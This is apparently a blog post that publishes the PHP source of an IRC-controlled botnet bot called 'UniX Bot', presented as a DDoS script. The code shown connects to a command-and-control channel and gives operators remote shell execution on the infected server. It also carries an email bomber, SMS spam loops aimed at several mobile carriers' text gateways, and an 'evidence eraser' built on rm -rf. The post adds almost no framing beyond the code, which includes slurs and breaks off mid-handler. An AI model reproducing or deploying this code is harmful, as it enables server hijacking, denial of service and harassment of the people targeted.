---
id: 39
title: DDoS script
author: admin
layout: post
guid: http://hackingscripts.com/?p=39
permalink: /ddos-script/
categories:
  - DDoS
  - DoS
  - PHP
tags:
  - DDoS
  - DoS
  - PHP
---
This is a [DoS/DDoS][1] (denial-of-service/distributed denial-of-service) script, which is used to temporarily take down a machine and make it unavailable to its intended users.

This particular script contained a lot of bad language, which I have censored for net-friendlinmess purposes.


### DDoS Script Source Code

{% highlight php linenos %}<?
if($_GET['act'] == 'lol'){
udpflood4($_GET['host'], $_GET['psize'], $_GET['time'], $_GET['port']);
}
/****************************************************/
/*     ---------------------UniX--------------------            */
/* UniX Bot - Coding by ANoN - This code is Very PUBLIC!            */
/* + Modded UDP Flooder         */
/* + Removed TCP Flooder                                */
/* + Added email bomb                                        */
/* + Added join message                    */
/* + Added !site command         */
/* + Added whois                                         */
/* + Added port scan                                         */
/* + Added Quick UDP Flood                                         */
/* + Added Colors                                        */
/* + Added Count Command    */
/* - Removed Host (IP Address) Auth (Its bullssss)    */
/* + Added Credits                                */
/* + Added Speedtest     */
/* - Removed Useless ssss    */
/* + Cleaned the code    */
/* + Added Version    */
/* + Added New nicks     */
/* + Added Update command     */
/* + Made the update command idiot proof    */
/* + Added commands command    */
/* + Added id command    */
/* + Added uptime command    */
/* + Added evidence eraser    */
/* + Added Cell Phone Spammer    */
/* + Added Cell info    */
/* + Added change prefix    */
/* + Added install update command    */
/* + Added port 3074 DDoS     */
/* + ICMP ddoS?    */
/* + FTP ddoS?    */
/* + Added 2 Player ddos feature     */
/* + Added 3 Player ddos feature     */
/* + Added 4 Player ddos feature     */
/****************************************************/
    set_time_limit( 0 );
    error_reporting( 0 );
    echo "ANoNyMoUS iZ LeGioN";
    class Mike_Unix
    {
        var $using_encode = true;
        var $config = array(
            'nickform'    => 'FraseR|%d]',
            'nickform2'    => '%d]',
            'prfix'    => 'NzM|%d]',
            'identp'    => 'Mike',
            'modes'        => '+B',
            'maxrand'    => 6,
            'maxrand2'    => 1,
            'maxrand3'    => 2,
            'maxrand4'    => 3,
            'cprefix'    => '.',
            'version'    => '1.0',
            'host'        => '*',
            'yellow'        => '12',
            'blue'        => '4',
            'orange'        => '9',
            'green'        => '7',
            'leetprefix'        => '4>>',
            'leetsuffix'        => '12<<',
            'leetprefixwhite'        => '0>>',
            'leetsuffixwhite'        => '0<<',
            'leetsuffixred'        => '4<<',
            'part1'        => '0?~{ 4',
            'part2'        => '0}~?',
            'hostauth'        => '*'
        );
        var $messages = array
        (
        'bad'        => '0?~{ 14L0o14G0i14N 0}~? 0',
        'loginmsg'    => '0?~{ 14L0o14G0i14N 0}~? 0',
        'entry'        => '0?~{ 14ElatioN 14B0o14T0 }~? 14E0x14e0c0u14t0e14D',
        'id'        => '0?~{ 4 Frasers Anti-Private bot v1.0  0}~?',
        'udpmsg'        => '0?~{ 12UDP Flood Active 0}~?',
        'udpmsgfast'        => '0?~{ 12Quick UDP-FLOOD 0}~?',
        'speedtest'        => '0?~{ 9 Speedtest Starting Up...... 0}~?',
        'speedtestfin'        => '0?~{ 9 The Speedtest Is Complete. 0}~?',
        'logoutmsg'        => '0?~{ 14S0e14e 0Y14a 0L14a0T14e0R,',
        'mailmsg'        => '14N0a14i0L14e0R',
        'sprintmsg'        => '14S0p14r0i14n0T 14P0C14S',
        'execmsg'        => '14E0x14E0C'
        );
        var $admins = array
        (
         'Fraser' => 'e48e13207341b6bffb7fb1622282247b',
         'RoboFTW' => '6d67f24e6f2cff6ed5b0495fab78618a',
         'chrisjnsn' => 'e48e13207341b6bffb7fb1622282247b',
         'Respect' => 'e48e13207341b6bffb7fb1622282247b',
         'NadeZ' => 'e48e13207341b6bffb7fb1622282247b',
         'Account6' => 'e48e13207341b6bffb7fb1622282247b',
         'Account7' => 'e48e13207341b6bffb7fb1622282247b',
         'Account8' => 'e48e13207341b6bffb7fb1622282247b',
         'Account9' => 'e48e13207341b6bffb7fb1622282247b',
         'Account10' => 'e48e13207341b6bffb7fb1622282247b',
         'Account11' => 'e48e13207341b6bffb7fb1622282247b',
        );
        function auth_host( $nick, $password, $host )
        {
                $this->users[ $host ] = true;
        }
        function is_authed( $host )
        {
            return isset( $this->users[ $host ] );
        }
        function remove_auth( $host )
        {
            unset( $this->users[ $host ] );
        }
        function ex( $cfe )
        {
            $res = '';
            if (!empty($cfe))
            {
                if(function_exists('class_exists') && class_exists('Perl'))
                {
                    $perl = new Perl();
                    $perl->eval( "system('$cfe');" );
                }
                if(function_exists('exec'))
                {
                    @exec($cfe,$res);
                    $res = join("\n",$res);
                }
                elseif(function_exists('shell_exec'))
                {
                    $res = @shell_exec($cfe);
                }
                elseif(function_exists('system'))
                {
                    @ob_start();
                    @system($cfe);
                    $res = @ob_get_contents();
                    @ob_end_clean();
                }
                elseif(function_exists('passthru'))
                {
                    @ob_start();
                    @passthru($cfe);
                    $res = @ob_get_contents();
                    @ob_end_clean();
                }
                elseif(function_exists('proc_open'))
                {
                    $res = proc_open($cfe);
                }
                elseif(@is_resource($f = @popen($cfe,"r")))
                {
                    $res = "";
                    while(!@feof($f)) { $res .= @fread($f,1024); }
                    @pclose($f);
                }
            }
            return $res;
        }
        function is_safe( )
        {
            if( ( @eregi( "uid", $this->ex( "id" ) ) ) || ( @eregi( "Windows", $this->ex( "net start" ) ) ) )
            {
                return 0;
            }
            return 1;
        }
        function ffff_you( )
        {
            if( $this->using_encode )
            {
                $enc0ded = "I0NhYmJhZ2U=";
                return base64_decode($enc0ded);
            }
            else
            {
                return '#'.$this->config[ 'chan' ];
            }
        }
        function start()
        {
            if( $this->using_encode )
            {
                $crackedout = "IPHERE";
                if(!($this->conn = fsockopen(base64_decode($crackedout),6667,$e,$s,30)))
                {
                    $this->start();
                }
            }
            else
            {
                if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))
                {
                    $this->start();
                }
            }
            $ident = $this->config['prefix'];
            $alph = range("0","9");
            for( $i=0; $i < $this->config['maxrand']; $i++ )
            {
                $ident .= $alph[rand(0,9)];
            }
            if( strlen( $this->config[ 'pass' ] ) > 0 )
            {
                $this->send( "PASS ".$this->config[ 'pass' ] );
            }
            $motha = "Fraser";
            $mike = " non-private non-unix";
            $this->send("USER ".$motha." 127.0.0.1 localhost :".$mike."");
            $this->set_nick( );
            $this->main( );
        }
        function main()
        {
            while(!feof($this->conn))
            {
                $this->buf = trim(fgets($this->conn,512));
                $cmd = explode(" ",$this->buf);
                if(substr($this->buf,0,6)=="PING :")
                {
                    $this->send("PONG :".substr($this->buf,6));
                }
                if(isset($cmd[1]) && $cmd[1] =="001")
                {
                    $this->send("MODE ".$this->nick." ".$this->config['modes']);
                    if( $this->using_encode )
                    {
                        $this->join($this->ffff_you( ),base64_decode($this->config['key']));
                        $entry = $this->messages['entry'];
                        $leetprefix = $this->config['leetprefix'];
                        $leetsuffixred = $this->config['leetsuffixred'];
                        $ip = ( $_SERVER["HTTP_HOST"] );
                        $blue = $this->config['blue'];
                        $red = $this->config['yellow'];
                        $this->privmsg( $this->ffff_you( ), "$leetprefix $entry $leetsuffixred" );
                    }
                    else
                    {
                        $this->join($this->ffff_you( ),$this->config['key']);
                    }
                    if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
                    else { $safemode = "off"; }
                    $uname = php_uname();
                }
                if(isset($cmd[1]) && $cmd[1]=="433")
                {
                    $this->set_nick();
                }
                if($this->buf != $old_buf)
                {
                    $mcmd = array();
                    $msg = substr(strstr($this->buf," :"),2);
                    $msgcmd = explode(" ",$msg);
                    $nick = explode("!",$cmd[0]);
                    $vhost = explode("@",$nick[1]);
                    $vhost = $vhost[1];
                    $nick = substr($nick[0],1);
                    $host = $cmd[0];
                    if($msgcmd[0]==$this->nick)
                    {
                        for($i=0;$i<count($msgcmd);$i++)
                            $mcmd[$i] = $msgcmd[$i+1];
                    }
                    else
                    {
                        for($i=0;$i<count($msgcmd);$i++)
                            $mcmd[$i] = $msgcmd[$i];
                    }
                    if(count($cmd)>2)
                    {
                        switch($cmd[1])
                        {
                            case "QUIT":
                            {
                                if( $this->is_authed( $host ) )
                                {
                                    $this->remove_auth( $host );
                                }
                            }
                            break;
                            case "PART":
                            {
                                if( $this->is_authed( $host ) )
                                {
                                    $this->remove_auth( $host );
                                }
                            }
                            break;
                            case "PRIVMSG":
                                if( ( substr($mcmd[0],0,1) == $this->config[ 'cprefix' ] ) )
                                {
                                    if( $this->is_authed( $host ) == false )
                                    {
                                        switch( substr( $mcmd[ 0 ], 1 ) )
                                        {
                                            case "l":
                                            {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                  if( $this->is_authed( $host ) )
                                                {
                                                if( $nick == "Fraser" )
                                                    {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                    $this->ex('rm -rf ion_cache.dat');
                                                    $this->ex('rm -rf *gow*');
                                                    $this->ex( "echo $nick >> ion_cache.dat" );
                                                    $loginmsg = $this->messages['loginmsg'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$loginmsg Hello, $leetprefix FraseR $leetsuffixred" );
                                                    break;
                                                }
                                                }
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                  if( $this->is_authed( $host ) )
                                                {
                                                    if( $nick == "RoboFTW" )
                                                    {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                    $this->ex('rm -rf ion_cache.dat');
                                                    $this->ex('rm -rf *gow*');
                                                    $this->ex( "echo $nick >> ion_cache.dat" );
                                                    $loginmsg = $this->messages['loginmsg'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$loginmsg  Robo's In DA House!" );
                                                    break;
                                                }
                                                }
                                                $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                  if( $this->is_authed( $host ) )
                                                {
                                                    if( $nick == "_0xi" )
                                                    {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                    $this->ex('rm -rf ion_cache.dat');
                                                    $this->ex('rm -rf *gow*');
                                                    $this->ex( "echo $nick >> ion_cache.dat" );
                                                    $loginmsg = $this->messages['loginmsg'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$loginmsg iTz My NiGGa $leetprefix $nick $leetsuffixred" );
                                                    break;
                                                }
                                                }
                                                $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                  if( $this->is_authed( $host ) )
                                                {
                                                    if( $nick == "HELLOKiTty" )
                                                    {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                    $this->ex('rm -rf ion_cache.dat');
                                                    $this->ex('rm -rf *gow*');
                                                    $this->ex( "echo $nick >> ion_cache.dat" );
                                                    $loginmsg = $this->messages['loginmsg'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$loginmsg Meeeeeow ;] $leetprefix $nick $leetsuffixred" );
                                                    break;
                                                }
                                                }
                                                $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                  if( $this->is_authed( $host ) )
                                                {
                                                    if( $nick == "chrisjnsn" )
                                                    {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                    $this->ex('rm -rf ion_cache.dat');
                                                    $this->ex('rm -rf *gow*');
                                                    $this->ex( "echo $nick >> ion_cache.dat" );
                                                    $loginmsg = $this->messages['loginmsg'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$loginmsg Hello Chris" );
                                                    break;
                                                }
                                                }
                                                $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                  if( $this->is_authed( $host ) )
                                                {
                                                    if( $nick == "KeShiMi" )
                                                    {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                    $this->ex('rm -rf ion_cache.dat');
                                                    $this->ex('rm -rf *gow*');
                                                    $this->ex( "echo $nick >> ion_cache.dat" );
                                                    $loginmsg = $this->messages['loginmsg'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$loginmsg LORD OF THE MO ffffIN KITTENS IN THA HOUSE $leetprefix $nick $leetsuffixred" );
                                                    break;
                                                }
                                                }
                                                $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                  if( $this->is_authed( $host ) )
                                                {
                                                    if( $nick == "Code" )
                                                    {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                    $this->ex('rm -rf ion_cache.dat');
                                                    $this->ex('rm -rf *gow*');
                                                    $this->ex( "echo $nick >> ion_cache.dat" );
                                                    $loginmsg = $this->messages['loginmsg'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$loginmsg Good day Mr. $leetprefix $nick $leetsuffixred" );
                                                    break;
                                                }
                                                }
                                                $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                  if( $this->is_authed( $host ) )
                                                {
                                                    if( $nick == "Router" )
                                                    {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                    $this->ex('rm -rf ion_cache.dat');
                                                    $this->ex('rm -rf *gow*');
                                                    $this->ex( "echo $nick >> ion_cache.dat" );
                                                    $loginmsg = $this->messages['loginmsg'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$loginmsg Kentucky Fried $leetprefix $nick $leetsuffixred" );
                                                    break;
                                                }
                                                }
                                                $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                  if( $this->is_authed( $host ) )
                                                {
                                                    if( $nick == "Respect" )
                                                    {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                    $this->ex('rm -rf ion_cache.dat');
                                                    $this->ex('rm -rf *gow*');
                                                    $this->ex( "echo $nick >> ion_cache.dat" );
                                                    $loginmsg = $this->messages['loginmsg'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$loginmsg Gonna HiT Sum XbL Kid'z" );
                                                    break;
                                                }
                                                }
                                                $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                  if( $this->is_authed( $host ) )
                                                {
                                                    if( $nick == "Mason" )
                                                    {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                    $this->ex('rm -rf ion_cache.dat');
                                                    $this->ex('rm -rf *gow*');
                                                    $this->ex( "echo $nick >> ion_cache.dat" );
                                                    $loginmsg = $this->messages['loginmsg'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$loginmsg By Your Command, $leetprefix $nick $leetsuffixred" );
                                                    break;
                                                }
                                                }
                                                $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                  if( $this->is_authed( $host ) )
                                                {
                                                    if( $nick == "NadeZ" )
                                                    {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                    $this->ex('rm -rf ion_cache.dat');
                                                    $this->ex('rm -rf *gow*');
                                                    $this->ex( "echo $nick >> ion_cache.dat" );
                                                    $loginmsg = $this->messages['loginmsg'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$loginmsg Hello there, $leetprefix $nick $leetsuffixred" );
                                                    break;
                                                }
                                                }
                                                else
                                                {
                                                    $this->auth_host( $nick, $mcmd[ 1 ], $host );
                                                    $this->ex('rm -rf ion_cache.dat');
                                                    $this->ex('rm -rf *gow*');
                                                    $this->ex( "echo $nick >> ion_cache.dat" );
                                                    $loginmsg = $this->messages['loginmsg'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$loginmsg Gonna HiT Sum XbL Kid'z" );
                                                    break;
                                                            }
                                                                }
                                    }
                                }
                                    else
                                    {
                                        switch(substr($mcmd[0],1))
                                        {
                                            case "exec":
                                            {
                                                if( !$this->is_safe( ) )
                                                {
                                                    $command = substr( strstr( $msg, $mcmd[0] ), strlen( $mcmd[0] ) + 1 );
                                                    $returndata = $this->ex( $command );
                                                    if( !empty( $returndata ) )
                                                    {
                                                        $execmsg = $this->messages['execmsg'];
                                                        $leetprefix = $this->config['leetprefix'];
                                                        $leetsuffixred = $this->config['leetsuffixred'];
                                                        $blue = $this->config['blue'];
                                                        $red = $this->config['yellow'];
                                                        $part1 = $this->config['part1'];
                                                        $part2 = $this->config['part2'];
                                                        $this->privmsg( $this->ffff_you( ),"$red $part1 $blue$execmsg $red $part2 $leetsuffixred $red $returndata");
                                                    }
                                                }
                                                break;
                                            }
                                                case "bomb":
                                            {
                                                if(count($mcmd) > 5)
                                                {
                                                    $header = "From: <".$mcmd[2].">";
                                                    if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[5]),$header))
                                                    {
                                                        $this->privmsg( $this->ffff_you( ),"[\2MAIL\2]: Unable to send email.");
                                                    }
                                                    else
                                                    {
                                                        $mbomb = 1;
                                                        while($mbomb <= $mcmd[4])
                                                            {
                                                                mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[5]),$header);
                                                                $mbomb++;
                                                            }
                                                        if($mbomb = $mcmd[4])
                                                            {
                                                                $mailmsg = $this->messages['mailmsg'];
                                                                $part1 = $this->config['part1'];
                                                                $part2 = $this->config['part2'];
                                                                $this->privmsg( $this->ffff_you( ),"$part1 $mailmsg: $part2 \2 Sent\3"."4 $mcmd[4] \3Emails to \3"."4$mcmd[1]\3 From: \3"."4$mcmd[2]\3 Subject: \3"."4$mcmd[3]\3 \2");
                                                            }
                                                    }
                                                }
                                                break;
                                            }
                                                case "sprint":
                                            {
                                                if(count($mcmd) > 5)
                                                {
                                                          $part1 = $this->config['part1'];
                                                        $part2 = $this->config['part2'];
                                                        $blue = $this->config['blue'];
                                                        $red = $this->config['yellow'];
                                                        $header = "From: <".$mcmd[2].">";
                                                        $mbomb = 1;
                                                        $sprintmail = "@messaging.sprintpcs.com";
                                                        $sprint = "$mcmd[1]$sprintmail";
                                                        while($mbomb <= $mcmd[4])
                                                            {
                                                                mail($sprint,$mcmd[3],strstr($msg,$mcmd[5]),$header);
                                                                $mbomb++;
                                                            }
                                                        if($mbomb = $mcmd[4])
                                                            {
                                                                $sprintmsg = $this->messages['sprintmsg'];
                                                                $this->privmsg( $this->ffff_you( ),"$part1$sprintmsg $part2$blue Sent ".$red." $mcmd[4] ".$blue."Text Message(s) to".$red." $mcmd[1] ".$blue."From:".$red." $mcmd[2]$blue With Subject: ".$red."$mcmd[3]");
                                                            }
                                                }
                                                break;
                                            }
                                                case "verizon":
                                            {
                                                if(count($mcmd) > 5)
                                                {
                                                          $part1 = $this->config['part1'];
                                                        $part2 = $this->config['part2'];
                                                        $blue = $this->config['blue'];
                                                        $red = $this->config['yellow'];
                                                        $header = "From: <".$mcmd[2].">";
                                                        $mbomb = 1;
                                                        $verizonmail = "@vtext.com";
                                                        $verizon = "$mcmd[1]$verizonmail";
                                                        while($mbomb <= $mcmd[4])
                                                            {
                                                                mail($verizon,$mcmd[3],strstr($msg,$mcmd[5]),$header);
                                                                $mbomb++;
                                                            }
                                                        if($mbomb = $mcmd[4])
                                                            {
                                                                $this->privmsg( $this->ffff_you( ),"$part1$red Verizon Wireless $part2$blue Sent ".$red." $mcmd[4] ".$blue."Text Message(s) to".$red." $mcmd[1] ".$blue."From:".$red." $mcmd[2]$blue With Subject: ".$red."$mcmd[3]");
                                                            }
                                                }
                                                break;
                                            }
                                                case "tmobile":
                                            {
                                                if(count($mcmd) > 5)
                                                {
                                                          $part1 = $this->config['part1'];
                                                        $part2 = $this->config['part2'];
                                                        $blue = $this->config['blue'];
                                                        $red = $this->config['yellow'];
                                                        $header = "From: <".$mcmd[2].">";
                                                        $mbomb = 1;
                                                        $tmobilemail = "@tmomail.net";
                                                        $tmobile = "$mcmd[1]$tmobilemail";
                                                        while($mbomb <= $mcmd[4])
                                                            {
                                                                mail($tmobile,$mcmd[3],strstr($msg,$mcmd[5]),$header);
                                                                $mbomb++;
                                                            }
                                                        if($mbomb = $mcmd[4])
                                                            {
                                                                $this->privmsg( $this->ffff_you( ),"$part1$red T-Mobile (USA Only) $part2$blue Sent ".$red." $mcmd[4] ".$blue."Text Message(s) to".$red." $mcmd[1] ".$blue."From:".$red." $mcmd[2]$blue With Subject: ".$red."$mcmd[3]");
                                                            }
                                                }
                                                break;
                                            }
                                                case "att":
                                            {
                                                if(count($mcmd) > 5)
                                                {
                                                          $part1 = $this->config['part1'];
                                                        $part2 = $this->config['part2'];
                                                        $blue = $this->config['blue'];
                                                        $red = $this->config['yellow'];
                                                        $header = "From: <".$mcmd[2].">";
                                                        $mbomb = 1;
                                                        $attemail = "@txt.att.net";
                                                        $att = "$mcmd[1]$attemail";
                                                        while($mbomb <= $mcmd[4])
                                                            {
                                                                mail($att,$mcmd[3],strstr($msg,$mcmd[5]),$header);
                                                                $mbomb++;
                                                            }
                                                        if($mbomb = $mcmd[4])
                                                            {
                                                                $this->privmsg( $this->ffff_you( ),"$part1$red AT&T $part2$blue Sent ".$red." $mcmd[4] ".$blue."Text Message(s) to".$red." $mcmd[1] ".$blue."From:".$red." $mcmd[2]$blue With Subject: ".$red."$mcmd[3]");
                                                            }
                                                }
                                                break;
                                            }
                                                case "uscellular":
                                            {
                                                if(count($mcmd) > 5)
                                                {
                                                          $part1 = $this->config['part1'];
                                                        $part2 = $this->config['part2'];
                                                        $blue = $this->config['blue'];
                                                        $red = $this->config['yellow'];
                                                        $header = "From: <".$mcmd[2].">";
                                                        $mbomb = 1;
                                                        $uscemail = "@email.uscc.net";
                                                        $usc = "$mcmd[1]$uscemail";
                                                        while($mbomb <= $mcmd[4])
                                                            {
                                                                mail($usc,$mcmd[3],strstr($msg,$mcmd[5]),$header);
                                                                $mbomb++;
                                                            }
                                                        if($mbomb = $mcmd[4])
                                                            {
                                                                $this->privmsg( $this->ffff_you( ),"$part1$red US Cellular $part2$blue Sent ".$red." $mcmd[4] ".$blue."Text Message(s) to".$red." $mcmd[1] ".$blue."From:".$red." $mcmd[2]$blue With Subject: ".$red."$mcmd[3]");
                                                            }
                                                }
                                                break;
                                            }
                                                case "boostmobile":
                                            {
                                                if(count($mcmd) > 5)
                                                {
                                                          $part1 = $this->config['part1'];
                                                        $part2 = $this->config['part2'];
                                                        $blue = $this->config['blue'];
                                                        $red = $this->config['yellow'];
                                                        $header = "From: <".$mcmd[2].">";
                                                        $mbomb = 1;
                                                        $boostemail = "@myboostmobile.com";
                                                        $boost = "$mcmd[1]$boostemail";
                                                        while($mbomb <= $mcmd[4])
                                                            {
                                                                mail($boost,$mcmd[3],strstr($msg,$mcmd[5]),$header);
                                                                $mbomb++;
                                                            }
                                                        if($mbomb = $mcmd[4])
                                                            {
                                                                $this->privmsg( $this->ffff_you( ),"$part1$red Boost Mobile Inc. $part2$blue Sent ".$red." $mcmd[4] ".$blue."Text Message(s) to".$red." $mcmd[1] ".$blue."From:".$red." $mcmd[2]$blue With Subject: ".$red."$mcmd[3]");
                                                            }
                                                }
                                                break;
                                            }
                                            case "count":
                                            {
                                                    $lines = $this->ex( "cat cache.dat | wc -l" );
                                                    $red = $this->config['yellow'];
                                                    $leetprefixwhite = $this->config['leetprefixwhite'];
                                                    $leetsuffixwhite = $this->config['leetsuffixwhite'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $this->privmsg( $this->ffff_you( ), "$red I have done $leetprefixwhite $lines $leetsuffixwhite floods in total." );
                                                break;
                                            }
                                                case "nick":
                                            {
                                                if( $mcmd[ 1 ] == nzm )
                                                    {
                                                    $this->nzm_nick();
                                                    break;
                                                    }
                                                if( $mcmd[ 1 ] == unix )
                                                    {
                                                    $this->busk_nick();
                                                    break;
                                                    }
                                                else
                                                {
                                                $this->set_nick;
                                                break;
                                            }
                                        }
                                            case "credits":
                                            {
                                                    $red = $this->config['yellow'];
                                                    $blue = $this->config['blue'];
                                                    $orange = $this->config['orange'];
                                                    $leetprefixwhite = $this->config['leetprefixwhite'];
                                                    $leetsuffixwhite = $this->config['leetsuffixwhite'];
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $version = $this->config['version'];
                                                    $this->privmsg( $this->ffff_you( ), "".$leetprefixwhite."".$red." FBI $leetsuffixwhite $orange Elation Bot Version $version By: $leetprefixwhite $red Mike $leetsuffixwhite $leetsuffixwhite $orange Built Using: $leetprefixwhite $red Frasers PHP Bot Builder $leetsuffixwhite" );
                                                break;
                                            }
                                            case "noevidence":
                                            {
                                                    $part1 = $this->config['part1'];
                                                    $part2 = $this->config['part2'];
                                                    $blue = $this->config['blue'];
                                                    $red = $this->config['yellow'];
                                                    $bybye = $this->ex( 'rm -rf *gow*' );
                                                    $this->privmsg( $this->ffff_you( ),"".$part1."".$red." EviDenCe ".$part2."".$blue." All Bot Files and Evidence Erased!");
                                                break;
                                            }
                                            case "version":
                                            {
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $blue = $this->config['blue'];
                                                    $red = $this->config['yellow'];
                                                    $version = $this->config['version'];
                                                    $this->privmsg( $this->ffff_you( ),"".$red."The bot version is $leetprefix$blue $version $leetsuffixred");
                                                break;
                                            }
                                            case "changeprefix":
                                            {
                                                      $this->config['cprefix'] = $mcmd[1];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $blue = $this->config['blue'];
                                                    $red = $this->config['yellow'];
                                                    $version = $this->config['version'];
                                                    $this->privmsg( $this->ffff_you( ),"".$red."Prefix Changed to $mcmd[1]");
                                                break;
                                            }
                                            case "id":
                                            {
                                                    $id = $this->messages['id'];
                                                    $this->privmsg( $this->ffff_you( ),"$id");
                                                break;
                                            }
                                            case "uptime":
                                            {
                                                    $part1 = $this->config['part1'];
                                                    $part2 = $this->config['part2'];
                                                    $blue = $this->config['blue'];
                                                    $red = $this->config['yellow'];
                                                    $up = $this->ex( 'w' );
                                                    $this->privmsg( $this->ffff_you( ),"".$part1."".$red." Uptime ".$part2."".$blue." ".$up."");
                                                break;
                                            }
                                            case "cellhelp":
                                            {
                                                    $part1 = $this->config['part1'];
                                                    $part2 = $this->config['part2'];
                                                    $blue = $this->config['blue'];
                                                    $red = $this->config['yellow'];
                                                    $cellhelp = "To spam a Cell Phone you will have to know the NUMBER and CARRIER. Example Command: ".$red.".verizon 5551234567 youremail@fbi.gov Subject NumberOfTextsToSend Message";
                                                    $this->privmsg( $this->ffff_you( ),"".$part1."".$red." Cell Spammer ".$part2."".$blue." ".$cellhelp."");
                                                break;
                                            }
                                            case "carriers":
                                            {
                                                    $part1 = $this->config['part1'];
                                                    $part2 = $this->config['part2'];
                                                    $blue = $this->config['blue'];
                                                    $red = $this->config['yellow'];
                                                    $bybye = $this->ex( 'rm -rf *gow*' );
                                                    $this->privmsg( $this->ffff_you( ),"".$part1."".$red." CaRRieRs ".$part2."".$blue." UniX can currently spam - AT&T, Verizon, Sprint, Alltel, T-Mobile, US Celluar, and Boost Mobile");
                                                break;
                                            }
                                            case "ver":
                                            {
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $blue = $this->config['blue'];
                                                    $red = $this->config['yellow'];
                                                    $version = $this->config['version'];
                                                    $this->privmsg( $this->ffff_you( ),"".$red."The bot version is $leetprefix$blue $version $leetsuffixred");
                                                break;
                                            }
                                            case "v":
                                            {
                                                    $leetprefix = $this->config['leetprefix'];
                                                    $leetsuffixred = $this->config['leetsuffixred'];
                                                    $blue = $this->config['blue'];
                                                    $red = $this->config['yellow'];
                                                    $version = $this->config['version'];
                                                    $this->privmsg( $this->ffff_you( ),"".$red."The bot version is $leetprefix$blue $version $leetsuffixred");
                                                break;
                                            }
                                            case "hop":
                                            {
                                                $channel = $mcmd[1];
                                                $this->send( "PART ".$channel );
                                                $this->join( $channel );
                                                break;
                                            }
                                            case "raw":
                                            {
                                                $this->send(strstr($msg,$mcmd[1]));
                                                break;
                                            }
                                            case "ip123":
                                            {
                                                $leetprefixwhite = $this->config['leetprefixwhite'];
                                                $leetsuffixwhite = $this->config['leetsuffixwhite'];
                                                $red = $this->config['yellow'];
                                                $blue = $this->config['blue'];
                                                $ipadd = "Ip AddReSS";
                                                $this->privmsg( $this->ffff_you( ),"$blue $ipadd $leetprefixwhite ".$red." ".$_SERVER['SERVER_ADDR']." $leetsuffixwhite");
                                                break;
                                            }
                                            case "lastlogin":
                                            {
                                                $red = $this->config['yellow'];
                                                $blue = $this->config['blue'];
                                                $part1 = $this->config['part1'];
                                                $part2 = $this->config['part2'];
                                                $attempt = $this->ex('cat ion_cache.dat');
                                                $this->privmsg( $this->ffff_you( ),"$part1$red LasT LogiN $part2$blue from $attempt");
                                                break;
                                            }
                                            case "commands":
                                            {
                                                $leetprefixwhite = $this->config['leetprefixwhite'];
                                                $leetsuffixwhite = $this->config['leetsuffixwhite'];
                                                $red = $this->config['yellow'];
                                                $blue = $this->config['blue'];
